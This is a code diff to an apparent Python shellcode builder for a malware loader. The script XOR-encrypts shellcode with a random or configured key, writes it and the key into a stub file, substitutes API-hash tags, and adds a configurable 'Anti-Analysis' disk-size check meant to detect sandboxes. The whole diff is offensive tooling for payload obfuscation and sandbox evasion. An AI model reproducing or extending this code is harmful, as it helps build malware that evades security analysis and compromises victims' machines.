@@ -21,10 +21,18 @@ USER_AGENT = config.get("Payload","user_agent")
 
 STUB_FILE = config.get("Stub", "filename")
 
+DISK_SIZE = config.get("Anti-Analysis", "disk_size")
+
 WORKING_FOLDER = "temp/"
 
 
 def main():
+
+    if config.get("Payload", "encryption_key") == "rand":
+        ENCRYPTION_KEY = random.randint(0, 0xFFFF)
+    else:
+        ENCRYPTION_KEY = int(config.get("Payload", "encryption_key"),16)
+
     print("===========CONFIG==========")
     print(f"ROR value: {ROR_VALUE}")
     print(f"Encryption byte: {ENCRYPTION_KEY}")
@@ -59,8 +67,9 @@ def main():
                 # Générer une valeur aléatoire de 32 bits
                 dword_value = random.randint(0, 0xFFFFFFF)
                 sed_file(WORKING_FOLDER+filename, tag, hex(dword_value))
-            if parts[0] == "STRING":
-                pass #todo
+            if parts[0] == "SANDBOX":
+                if parts[1] == "DISKSIZE":
+                    sed_file(WORKING_FOLDER+filename, tag, DISK_SIZE)
 
     # Tags like %HASH__MODULE__FUNCTION% are replaced by their hash
 
@@ -80,18 +89,14 @@ def main():
     print("================================\n")
 
     # Encrypt the shellcode
-    if ENCRYPTION_KEY != "":
-        print("===========ENCRYPTION==============")
-        print(instructions)
-        print(f"\nEncrypted with '{ENCRYPTION_KEY}'\n")
-        encrypted_instructions = xor2_encrypt_decrypt(instructions, int(ENCRYPTION_KEY, 16))
-        print(encrypted_instructions)
-        print("===================================\n")
-        sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE%", format_instructions(encrypted_instructions))
-        sed_file(WORKING_FOLDER+STUB_FILE, "%XOR_KEY%", ENCRYPTION_KEY)
-    else:
-        sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE%", format_instructions(instructions))
-        sed_file(WORKING_FOLDER+STUB_FILE, "%XOR_KEY%", "")
+    print("===========ENCRYPTION==============")
+    print(instructions)
+    print(f"\nEncrypted with '{ENCRYPTION_KEY}'\n")
+    encrypted_instructions = xor2_encrypt_decrypt(instructions, ENCRYPTION_KEY)
+    print(encrypted_instructions)
+    print("===================================\n")
+    sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE%", format_instructions(encrypted_instructions))
+    sed_file(WORKING_FOLDER+STUB_FILE, "%XOR_KEY%", str(ENCRYPTION_KEY))
 
     
 
